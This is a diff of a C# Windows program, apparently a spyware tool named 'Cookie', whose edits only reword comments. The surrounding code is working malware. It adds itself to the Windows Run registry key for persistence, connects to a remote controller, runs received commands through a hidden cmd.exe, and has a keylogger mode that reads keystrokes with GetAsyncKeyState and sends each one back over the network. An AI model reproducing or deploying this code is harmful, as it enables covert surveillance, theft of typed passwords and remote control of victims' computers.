@@ -30,7 +30,7 @@ namespace Cookie
         private void Form1_Load(object sender, EventArgs e)
         {
 
-            // this is for the Autorun of the spyware
+            // Autorun of the spyware
             RegistryKey AutoRun = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", true);
                                                                                                                         
             if (AutoRun.GetValue("winDir") == null)
@@ -64,7 +64,7 @@ namespace Cookie
             {
                 NetworkStream stream = cookie.GetStream();
 
-                // cookie is the confirm message -- like 0 errors
+                // "cookie" is the OK message -- like 0 errors
                 int len = Encoding.ASCII.GetByteCount("cookie");
                 byte[] msg = new byte[len];
                 msg = Encoding.ASCII.GetBytes("cookie");
@@ -73,7 +73,7 @@ namespace Cookie
                 byte[] recv;
                 byte[] inv;
 
-                // this is for using CMD
+                // CMD
                 System.Diagnostics.Process cmd = new System.Diagnostics.Process();
                 System.Diagnostics.ProcessStartInfo ex = new System.Diagnostics.ProcessStartInfo();
                 ex.RedirectStandardOutput = true;
@@ -86,21 +86,21 @@ namespace Cookie
                 do
                 {
                     recv = new byte[cookie.ReceiveBufferSize];
-                    stream.Write(msg, 0, msg.Length); // here a receive the command
+                    stream.Write(msg, 0, msg.Length); // here we receive the command
                     red = stream.Read(recv, 0, (int)cookie.ReceiveBufferSize);
                     com = Encoding.ASCII.GetString(recv, 0, red);
                     if (com.Equals("close"))
-                        st = 1; // and here i close the do while loop
+                        st = 1; // and here we close the do while loop
                     else if (com.Equals("key")) // if the command is key
                     {                          // switch mode to KeyLogger
                         int key;
                         while (true)
                         {
-                            Thread.Sleep(10); // here i read the key
+                            Thread.Sleep(10); // here we read the key
                             for (Int32 i = 32; i < 126; i++)
                             {
 
-                                key = GetAsyncKeyState(i); // reading just the alphabet key
+                                key = GetAsyncKeyState(i); // reading just letters key
                                 if (key == 1 || key == -32767)
                                 {
                                     com = ((char)i).ToString();
@@ -108,7 +108,7 @@ namespace Cookie
                                     inv = new byte[len];
                                     inv = Encoding.ASCII.GetBytes(com);
                                     stream.Write(inv, 0, inv.Length);
-                                    // sending the key
+                                    // sending the key pressed
 
                                     recv = new byte[cookie.ReceiveBufferSize];
                                     red = stream.Read(recv, 0, recv.Length);
